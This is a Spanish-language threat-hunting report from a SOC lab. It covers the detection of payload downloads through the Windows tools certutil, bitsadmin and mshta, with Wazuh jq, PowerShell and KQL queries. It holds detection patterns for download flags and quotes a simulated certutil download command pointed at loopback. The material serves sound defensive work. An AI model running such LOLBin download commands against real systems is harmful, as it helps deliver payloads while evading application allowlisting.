# 🔎 Hunt H2 — Ingress Tool Transfer via LOLBins (certutil/bitsadmin/mshta)

> **Command and Control → Ingress Tool Transfer (T1105)**: abuso de binarios legítimos del sistema (LOLBins) para descargar payloads desde la red, evadiendo controles de aplicaciones.

## Hipótesis

Un atacante con ejecución en WIN11 (10.10.10.21) emplea binarios firmados por Microsoft —`certutil.exe`, `bitsadmin.exe`, `mshta.exe`— como descargadores de segunda etapa, en lugar de traer su propia herramienta. Sospechamos que esta técnica está presente porque permite eludir allowlisting de aplicaciones (el binario es nativo y de confianza) y porque suele pasar desapercibida en telemetría centrada solo en `image`. Cazamos sobre la línea de comandos para confirmar si hay descargas de red disfrazadas de actividad administrativa.

## Técnica ATT&CK

**T1105 — Ingress Tool Transfer** (táctica *Command and Control*, TA0011). El adversario transfiere herramientas o payloads desde un sistema externo al entorno comprometido. Con LOLBins, el binario legítimo hace el trabajo del descargador: `certutil -urlcache -f <url>` recupera y cachea un archivo, `bitsadmin /transfer` programa una descarga vía BITS, y `mshta http://...` descarga y ejecuta un HTA remoto. Al ser ejecutables nativos firmados, evaden defensas basadas en reputación o lista blanca de procesos.

> **Nota de mapeo:** el caso de `mshta http://...` también mapea a **T1218.005 — System Binary Proxy Execution: Mshta** (Defense Evasion), ya que no solo transfiere sino que ejecuta el HTA remoto. En este hunt lo tratamos bajo T1105 porque el foco es la **transferencia/descarga**; la ejecución por proxy de firma queda como técnica relacionada.

## Fuente de datos

- **Security 4688** (creación de proceso con línea de comandos) — imagen en `win.eventdata.newProcessName`.
- **Microsoft-Windows-Sysmon/Operational EID 1** (creación de proceso, hash SHA256 + linaje/ParentImage) — imagen en `win.eventdata.image`.
- **Campo pivote:** `win.eventdata.commandLine`, común a 4688 y Sysmon EID 1, por lo que cazar sobre él es **agnóstico del sensor**. Esto resulta crítico en este lab: en el histórico, `certutil.exe` solo dejó rastro en **Security 4688** y no en Sysmon EID 1 (ver "Hallazgos"). Una caza que mirara solo `win.eventdata.image` (Sysmon) habría tenido un falso negativo total.
- Almacén: el archivado total (`logall`/`archives.json`) está apagado, pero la regla base de Wazuh **67027** alerta en cada 4688 (nivel 3), de modo que `alerts.json` contiene de facto todo el histórico de creación de procesos de WIN11. La caza mira esa telemetría cruda, no solo lo que ya disparó una regla de detección dedicada.

## La caza

### Wazuh (alerts.json, jq en el manager)

```bash
# Caza primaria: cualquier proceso cuya línea de comandos invoque un LOLBin de descarga
# con flags de transferencia de red. Agnóstico del sensor (4688 + Sysmon comparten commandLine).
jq -r 'select(.data.win.eventdata.commandLine != null)
       | .data.win.eventdata.commandLine
       | select(test("certutil|bitsadmin|mshta"; "i"))
       | select(test("-urlcache|/transfer|https?://"; "i"))' \
  /var/ossec/logs/alerts/alerts.json | sort | uniq -c | sort -rn

# Recuento por binario LOLBin para dimensionar volumen y triar ruido.
# (El select(. != null) descarta las líneas sin coincidencia para no contar buckets vacíos.)
jq -r 'select(.data.win.eventdata.commandLine != null)
       | .data.win.eventdata.commandLine
       | ascii_downcase
       | capture("(?<bin>certutil|bitsadmin|mshta|rundll32)\\.exe")?.bin
       | select(. != null)' \
  /var/ossec/logs/alerts/alerts.json | sort | uniq -c | sort -rn

# Contexto completo de cada hallazgo: host, evento, regla disparada, línea de comandos.
jq -r 'select(.data.win.eventdata.commandLine != null)
       | select(.data.win.eventdata.commandLine | test("certutil.*-urlcache|bitsadmin.*/transfer|mshta.*https?://"; "i"))
       | [.agent.name, .data.win.system.eventID, (.rule.id // "-"), .data.win.eventdata.commandLine]
       | @tsv' \
  /var/ossec/logs/alerts/alerts.json
```

### Origen — logs crudos (PowerShell Direct, Get-WinEvent)

```powershell
# Desde el host Hyper-V hacia WIN11, validando el origen sin depender del pipeline a Wazuh.
# Security 4688: aquí es donde realmente cayó certutil (Sysmon EID 1 no lo registró).
Invoke-Command -VMName WIN11 -ScriptBlock {
    Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4688 } |
      Where-Object { $_.Message -match 'certutil|bitsadmin|mshta' -and
                     $_.Message -match '-urlcache|/transfer|http' } |
      ForEach-Object {
          $x = [xml]$_.ToXml()
          [pscustomobject]@{
              Hora    = $_.TimeCreated
              Imagen  = ($x.Event.EventData.Data | Where-Object Name -eq 'NewProcessName').'#text'
              CmdLine = ($x.Event.EventData.Data | Where-Object Name -eq 'CommandLine').'#text'
          }
      } | Format-Table -AutoSize -Wrap
}

# Contraste: comprobar si Sysmon EID 1 registró certutil. En este lab salió vacío,
# lo que confirma que el único rastro fue Security 4688 (ver "Hallazgos").
Invoke-Command -VMName WIN11 -ScriptBlock {
    Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; Id=1 } |
      Where-Object { $_.Message -match 'certutil' }
}
```

### KQL (Sentinel / Defender XDR — equivalente teórico)

```kql
// Equivalente teórico en SIEM cloud (NO se ejecuta en el lab; Wazuh es el SIEM real).
// DeviceProcessEvents = telemetría EDR rica en línea de comandos.
DeviceProcessEvents
| where FileName in~ ("certutil.exe", "bitsadmin.exe", "mshta.exe")
| where ProcessCommandLine has_any ("-urlcache", "/transfer", "http://", "https://")
| project Timestamp, DeviceName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AccountName
| sort by Timestamp desc

// Equivalente sobre eventos clásicos de Windows (4688) si solo hay SecurityEvent.
SecurityEvent
| where EventID == 4688
| where NewProcessName has_any ("certutil.exe", "bitsadmin.exe", "mshta.exe")
| where CommandLine has_any ("-urlcache", "/transfer", "http")
| project TimeGenerated, Computer, NewProcessName, CommandLine, SubjectUserName
| sort by TimeGenerated desc
```

## Hallazgos (datos REALES del lab)

| LOLBin | Apariciones en `commandLine` | Patrón observado | Veredicto |
|---|---:|---|---|
| `certutil.exe` | **16** | `certutil.exe -urlcache -f http://127.0.0.1/soc-de-test ...` | **Malicioso (simulado)** — descarga T1105; disparó regla **100150** |
| `rundll32.exe` | 5 | Uso nativo de Windows (sin patrón de descarga ni URL) | Known-good — ruido a triar (no es parte del set LOLBin de descarga de este hunt) |
| `powershell.exe` | 35 | Intérprete; no es LOLBin de descarga por sí solo | Fuera de alcance de este hunt |

Detalles clave:
- Las **16** ejecuciones de `certutil.exe` corresponden todas al mismo patrón de descarga simulada (`-urlcache -f http://127.0.0.1/soc-de-test`), coherente con una prueba T1105 controlada.
- **Matiz de sensor confirmado por la telemetría:** el único evento generado para `certutil` fue **Security 4688** (imagen en `newProcessName`); la consulta de contraste sobre **Sysmon EID 1 salió vacía**. La causa más probable es que el filtro `ProcessCreate` de Sysmon (modo `onmatch="include"`) no lista `certutil.exe`, por lo que no se generó EID 1 — esto debe verificarse contra el `sysmonconfig` desplegado en WIN11. Independientemente de la causa raíz, el dato observable (4688 sí, Sysmon EID 1 no) **valida la decisión de cazar por `commandLine` y no por `image`**.
- **Defensa en profundidad:** Windows Defender **detectó y bloqueó** el `certutil` (eventos 1116/1117 → reglas 100160/100161, ver Hunt H3) — el endpoint no quedó dependiendo de una sola capa.
- No se observaron `bitsadmin` ni `mshta` con flags de descarga en el histórico.

## Triage: known-good vs malicioso

1. **`commandLine` por encima de `image`.** El binario en sí (`certutil.exe`) es legítimo; lo que delata el abuso es el verbo de red. Filtrar `-urlcache`/`/transfer`/`http(s)://` separa la descarga del uso administrativo normal (p. ej. `certutil -hashfile`, gestión de certificados).
2. **`rundll32.exe` (5)**: en este lab es uso nativo de Windows, sin URL ni patrón de carga de DLL remota → **descartado como known-good** tras revisar línea de comandos y linaje. No forma parte del set LOLBin de descarga (certutil/bitsadmin/mshta) que persigue este hunt; aparece solo como contexto en el recuento.
3. **`powershell.exe` (35)**: intérprete legítimo; no constituye T1105 por sí solo. La descarga vía PowerShell se cubre en otra superficie (4104 Script Block, regla 100120 ofuscación), no aquí.
4. **Indicador de simulación:** destino `127.0.0.1` (loopback) y marcador `soc-de-test` confirman que es la prueba SOC controlada, no exfil/descarga real — pero la regla debe disparar igual: la lógica de detección **no debe depender de la IP de destino**.

## Outcome

- **Cobertura confirmada.** Las reglas **100150** (certutil), **100151** (bitsadmin) y **100152** (mshta), que casan sobre `win.eventdata.commandLine`, detectan correctamente el patrón T1105. La regla 100150 disparó en las 16 ejecuciones de certutil.
- **Decisión de ingeniería de detección validada:** las reglas casan `commandLine` (común a 4688 y Sysmon), **no `image`**. Esto las hace robustas frente a la ausencia de `certutil` en Sysmon EID 1, que de otro modo habría producido un falso negativo. **Recomendación de seguimiento:** verificar el `ProcessCreate onmatch="include"` del `sysmonconfig` de WIN11 y, si efectivamente excluye estos binarios, ampliarlo para incluir `certutil.exe`/`bitsadmin.exe`/`mshta.exe` y ganar el linaje (ParentImage) + SHA256 de EID 1 como telemetría redundante.
- **Defensa en profundidad acreditada:** detección Wazuh (100150) + bloqueo de Defender (1116/1117 → reglas 100160/100161, Hunt H3) cubren la misma actividad en capas independientes.
- **Sin acción de respuesta requerida:** actividad identificada como simulación T1105 controlada (loopback `127.0.0.1`, marcador `soc-de-test`); cobertura de detección verificada y documentada.
